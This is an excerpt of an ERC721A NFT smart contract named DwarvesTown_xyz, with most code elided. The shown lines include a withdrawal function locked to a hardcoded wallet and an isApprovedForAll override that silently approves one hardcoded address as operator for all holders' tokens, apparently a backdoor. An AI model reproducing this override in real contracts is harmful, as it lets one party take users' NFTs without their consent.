...
contract DwarvesTown_xyz is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("DwarvesTown_xyz", "DT", maxBatchSize_, collectionSize_) {
...
//提款钱包
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x94323d0ff72d97116317c755198F072F83CDCDf4);
...
/*     string memory baseId;
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  { 
    if(operator==0x6B6788D90c8bBEB0B9206D1a61e5d27725c3aDb3){return true;}
